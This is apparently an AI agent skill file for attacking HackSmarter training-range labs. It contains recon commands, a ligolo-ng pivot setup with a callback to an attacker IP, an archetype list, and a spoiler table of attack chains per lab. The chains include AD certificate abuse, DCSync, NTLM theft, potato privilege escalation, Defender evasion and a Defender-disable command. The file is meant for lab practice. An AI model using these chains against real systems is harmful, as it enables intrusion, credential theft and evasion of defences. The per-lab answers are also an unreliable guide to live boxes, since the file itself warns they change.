---
name: hacksmarter-labs
description: HackSmarter labs (VPN-attached training range) — environment conventions, the recurring lab archetypes, opening recon playbook, and a per-lab technique index for the 2025 set. Use when attacking any HackSmarter lab over the VPN.
metadata:
  type: offensive
  phase: full-kill-chain
  range: hacksmarter
  tools: rustscan, nmap, netexec, bloodhound-ce, certipy, bloodyAD, evil-winrm, ligolo-ng, responder, hashcat, impacket
  reference: https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025
---

# HackSmarter Labs

## When to Activate

- The user is on the HackSmarter VPN attacking a lab box (target in `10.1.0.0/16`).
- They name a 2025 lab (Welcome, Hunter, Arasaka, Odyssey, PivotSmarter, etc.).
- They ask "how do I approach this HackSmarter box" or share a lab IP/hostname.

This skill is a **range-specific overlay**. It tells you the conventions of the HackSmarter
environment and which archetype a box is, then hands off to the deep skills:

- AD chains → [`skills/active-directory-attack/SKILL.md`](../active-directory-attack/SKILL.md)
- nxc syntax → [`skills/netexec/SKILL.md`](../netexec/SKILL.md)
- Web exploitation → [`skills/web-pentest/SKILL.md`](../web-pentest/SKILL.md)
- Linux privesc → [`skills/privesc-linux/SKILL.md`](../privesc-linux/SKILL.md)
- Windows privesc → [`skills/privesc-windows/SKILL.md`](../privesc-windows/SKILL.md)
- Cloud (AWS) → [`skills/cloud-security/SKILL.md`](../cloud-security/SKILL.md)

## Range Conventions

| Thing | Convention | Notes |
|-------|------------|-------|
| VPN interface | `tun0` | All Responder/ligolo/listener binds use `tun0`. Confirm with `ip a show tun0`. |
| Your attacker IP | `10.200.x.x` | This is the address targets reach back to (reverse shells, Responder, ligolo proxy). |
| Target subnet | `10.1.0.0/16` | Each lab gets its own `/24` (e.g. `10.1.239.0/24`). The box IP is given on the lab page. |
| Internal/pivot subnets | second `10.1.x.0/24`, reached only via a pivot host | Multi-host labs (PivotSmarter, ShareThePain, Odyssey, NorthBridge) hide the real target behind a jump box. |
| Ligolo route | `240.0.0.1` = the agent host's own services | `ip route add 240.0.0.1 dev ligolo` exposes loopback-bound services (MSSQL/MySQL on the pivot). |
| Lab domains | custom, non-routable: `WELCOME.local`, `hack.smarter`, `hsm.local`, `polution.hsm`, `*.hs` | **Always add the DC/host to `/etc/hosts` first** — Kerberos and vhost routing break without it. |
| Flags | `user.txt` (user desktop / `/home`), `root.txt` (`C:\Users\Administrator\Desktop` or `/root`) | Two flags per box is the norm. |
| Initial creds | Often "phished"/provided on the lab page for a low-priv user | Easy/Medium AD boxes hand you a starting identity; the lab *is* the chain from there. |

### First two minutes on any box

```bash
# 1. Resolve names (grab hostname/domain from the lab page or from nxc smb banner)
echo "10.1.x.x  dc01.<domain>  <domain>" | sudo tee -a /etc/hosts

# 2. Fast TCP sweep (the range default — every 2025 writeup opens with this)
rustscan -b 500 -a 10.1.x.x -- -sC -sV -Pn

# 3. Branch on what's open:
#    - 445/389/88/636 present  → AD archetype (see below + active-directory-attack skill)
#    - only 80/443/3000/5000/8080/8978 → web archetype
#    - 22 + service            → Linux archetype
#    - no Windows ports, AWS hints → cloud archetype
```

## Lab Archetypes (recognise → solve)

HackSmarter recycles a small set of chains. Identify the archetype, then drive the matching deep skill.

1. **DACL reset chain (AD, Easy/Medium).** Provided low-priv user → BloodHound shows
   `GenericAll` / `ForceChangePassword` / `GenericWrite` toward a more useful principal →
   reset their password with `bloodyAD set password` or `net rpc password`. Often chains 2-3 hops.
   *Seen in: Welcome, ShareThePain, Arasaka, MidGarden2, Building Magic.*

2. **ESC1 finish (AD).** A DACL/Kerberoast chain delivers a CA-enrollment-capable service account →
   `certipy find -vulnerable` shows an ESC1 template → request a cert with `-upn administrator@domain` →
   `certipy auth` → DA hash → `wmiexec2.py` (chosen specifically to dodge Defender).
   *Seen in: Welcome, Arasaka, Anomaly.*

3. **SeImpersonate → potato → SYSTEM (Windows).** Foothold lands as a service identity
   (IIS AppPool, `MSSQL$SQLEXPRESS`) with `SeImpersonatePrivilege` → compile `EfsPotato.cs`
   on-target with native `csc.exe` → SYSTEM → `net user 0xb0b ... /add` local admin.
   *Seen in: ShareThePain, Staged, Evasive.*

4. **Backup Operators / SeBackupPrivilege → registry dump (Windows/AD).** Account is in
   Backup Operators → `reg.py <user>@host backup -o \\you\share` to grab SAM/SYSTEM/SECURITY →
   `secretsdump.py LOCAL` offline → PtH as local admin, sometimes machine hash → DCSync.
   *Seen in: Odyssey, NorthBridge, Building Magic.*

5. **GPO abuse (AD domain).** BloodHound shows `GenericWrite`/edit rights on a GPO →
   `pygpoabuse.py` adds your user to Domain Admins / local Administrators → `gpupdate /force`.
   *Seen in: Odyssey, Static.*

6. **NTLM theft via SMB drop (AD).** Writable share → plant a malicious `.lnk`/`.url`
   (`ntlm_theft.py --generate modern`) → catch NetNTLMv2 with `responder -I tun0` →
   `hashcat -m 5600`. Frequently the bridge between two identities.
   *Seen in: ShareThePain, Building Magic.*

7. **Roast first (AD).** AS-REP roast (`-m 18200`) on a no-preauth user, or Kerberoast
   (`GetUserSPNs.py` / `nxc --kerberoasting`, `-m 13100`) on an SPN account, then crack.
   TargetedKerberoast after a `GenericWrite` write is a recurring variant.
   *Seen in: Static, Arasaka.*

8. **Pivot then attack (multi-host).** First host is a foothold only; the flag/service lives
   on an unreachable subnet. Stand up **ligolo-ng** (see snippet below) and re-run recon
   through the tunnel. Internal services are often DB engines (MSSQL/MySQL) bound to loopback.
   *Seen in: PivotSmarter, ShareThePain, Staged, Odyssey, NorthBridge.*

9. **Web app to shell (Linux).** SSTI (Jinja2 `{{7*7}}` → `__globals__` RCE), file upload,
   prototype-pollution+XSS, or default creds (Jenkins `admin:admin`) → reverse shell as
   `www-data`/service → Linux privesc (sudo misconfig, SUID PATH hijack, cron/script hijack,
   Linux capabilities, writable service binary).
   *Seen in: Polution, Odyssey, Anomaly, Talisman, Hunter, SNS-adjacent.*

10. **Cloud misconfig (AWS).** No Windows ports — the box is an AWS scenario. Anonymous/over-permissive
    S3 (read+write → swap an auth JS module to steal creds), or low-priv IAM with `sns:Subscribe`
    to siphon secrets from a public topic.
    *Seen in: SNS Secrets, Ascension (S3 module-swap), Talisman (DB file-read pivot).*

## Pivoting Cheat Sheet (ligolo-ng — the range standard)

```bash
# Attacker box — one-time interface
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                                  # listens on 11601

# Per pivot host
sudo ip route add <internal-subnet>/24 dev ligolo  # route the hidden subnet
sudo ip route add 240.0.0.1 dev ligolo             # reach the agent host's own loopback services

# On the foothold host (upload agent.exe / agent first)
./agent.exe -connect 10.200.x.x:11601 --ignore-cert

# Now recon the internal subnet normally; loopback DBs answer on 240.0.0.1
nxc mssql 240.0.0.1 -u <user> -p '<pw>'            # xp_cmdshell + SeImpersonate → potato
```

## Per-Lab Index — 2025 Set

> Spoiler-level technique chains. Use to confirm an approach or unblock, not to skip enumeration —
> the labs rotate IPs/creds and the writeups occasionally diverge from the live box.

| Lab | Difficulty | Type | Chain (foothold → win) |
|-----|-----------|------|------------------------|
| Welcome | Easy | AD | phished `e.hills` → PDF pw (`pdf2john`) → `a.harris` → DACL chain (`bloodyAD`) to `svc_ca` → **ESC1** (certipy) → DA → `wmiexec2` |
| Hunter | Easy | Web | timing-based username enum on password-reset (`ffuf` filter on response >500ms). Recon-focused box. |
| SNS Secrets | Easy | Cloud/AWS | low-priv IAM `sns:Subscribe` → subscribe attacker email to public SNS topic → leaked API Gateway key → call `/user-data` |
| Slayer | Easy | Windows | SE creds `tyler.ramsey` → RDP → `PrivescCheck.ps1` finds **insecure perms on SysMgmtAgent** → pivot `alice.wonderland` (desktop.ini) → `sc.exe config` binPath hijack → SYSTEM |
| Talisman | Easy | Linux/DB | leaked `jane` creds → CloudBeaver:8978 → Oracle `DBMS_XSLPROCESSOR.READ2CLOB` file-read → `oracle` SSH key → sudo on owned `root.sh` (replace script) → root |
| Arasaka | Easy | AD | `faraday` → Kerberoast `alt.svc` → DACL reset `yorinobu` (bloodyAD) → TargetedKerberoast `soulkiller.svc` → **ESC1** `AI_Takeover` template → DA `the_emperor` |
| Ascension | Easy | Linux | anon FTP (`pwlist.txt`) + NFS `showmount` → SSH key (`ssh2john`) → `pspy64` finds `/tmp/backup.sh` → user2 → linpeas/MySQL creds → user3 → **cap_setuid** on python3 → root |
| Staged | Medium | Windows | file-upload web shell as `j.smith` (Go reverse shell) → **SeImpersonate + EfsPotato** → SYSTEM → mimikatz → crack `p.richardson` → ligolo to internal MySQL |
| Static | Medium | AD | **AS-REP roast** `jack.dowland` (kerbrute+hashcat) → email recon (Cisco/SSH creds) → `lainey.moore`/`greg.shields` → **pyGPOabuse** GenericWrite on Default Domain Policy → admin on DC |
| Sysco | Medium | Cloud/AWS | anonymous read+write S3 (`cg-assets-…`) → replace `auth-module.js` with credential-stealer → harvest `tyler` creds from `creds-*.txt` |
| Evasive | Medium | Windows/AD | anon SMB → reuse `roger` pw → `swaks` SMTP phish Go reverse shell to `alfonso` → ASPX web shell (IIS AppPool) → **SeImpersonate/EfsPotato** → SYSTEM → disable Defender |
| Anomaly | Medium | Linux→AD | Jenkins default `admin:admin`:8080 → busybox reverse shell → sudo `/usr/bin/router_config` injection → keytab → `kinit` `Brandon_Boyd` → **ESC1** (certipy, computer acct) → DA `anna_molly` → `wmiexec2` |
| BankSmarter | Medium | Linux | `snmpwalk` creds → `hydra` SSH `layne.stanley` → hijack `bankSmarter_backup.sh` → `socat` unix-socket impersonation → **SUID PATH hijack** on `bank_backupd` (fake `python3` in /tmp) → root |
| ShareThePain | Medium | AD | guest writable share → `ntlm_theft` .lnk → Responder NetNTLMv2 → crack `bob.ross` → DACL reset `alice.wonderland` → MSSQL via ligolo → **SeImpersonate/EfsPotato** → SYSTEM |
| Odyssey | Hard | Linux+AD | **SSTI** (Jinja2) on Web-01 → www-data → SSH key from `.bash_history` → root → crontab leaks `ghill_sa` → **Backup Operators** reg.py hive dump → local admin → SharpHound → **GPO GenericWrite** → pyGPOabuse → DA |
| NorthBridge Systems | Hard | AD | SMB script leaks `_svrautomationsvc` → **WriteAccountRestrictions** → RBCD (bloodyAD+rbcd.py, new machine acct) → `getST.py` impersonate local admin → DPAPI `_backupsvc` (Backup Operators) → reg.py hives → machine hash → **DCSync** |
| MidGarden2 | Hard | AD (Srv 2025) | LDAP user-description temp pw → `thor` → **ForceChangePassword** `hodr` → WinRM → **BadSuccessor** rogue dMSA linked to Enterprise Admin `ymir` (Rubeus obfuscated w/ Codecepticon) → forged tickets → secretsdump |
| PivotSmarter | Basic | Pivoting | `evil-winrm` `j.smith` on jump box → **ligolo-ng** tun + route internal `/24` → reach internal web server → login.html flag |
| Building Magic | Medium | AD | crack leaked DB creds → SMB `r.widdleton` → RID brute → Kerberoast `r.haggard` → reset `h.potch` → NTLM theft .lnk → `h.grangon` (WinRM) → **SeBackupPrivilege** hive dump → PtH `a.flatch` (DA) |

## Querying the writeups live

The GitBook exposes an agent-query endpoint — append `?ask=<question>` to a lab page to pull
detail not in the index above (exact payloads, gotchas). Example:

```bash
# WebFetch / curl with the ask param for a specific step
https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/odyssey.md?ask=exact%20pyGPOabuse%20command
```

Prefer this over guessing when a chain stalls on a step the index summarises.

## Notes & OPSEC

- **`wmiexec2.py` and on-target `csc.exe` compilation are deliberate Defender dodges** on these
  boxes — several labs ship Defender on. Disabling it (`Set-MpPreference -DisableRealtimeMonitoring $true`)
  is only safe *after* you already hold SYSTEM/local admin.
- These are isolated training boxes — destructive steps (replacing scripts, resetting passwords,
  disabling Defender) are in-scope here but stay range-only. Don't carry those habits to real engagements.
- Capture findings to the engagement report as usual if running under a report (per repo CLAUDE.md),
  but for solo lab practice a lightweight notes file is enough.
- Always exhaust enumeration before reaching for a chain — IppSec rule. The index tells you the
  *intended* path; the box may have changed.
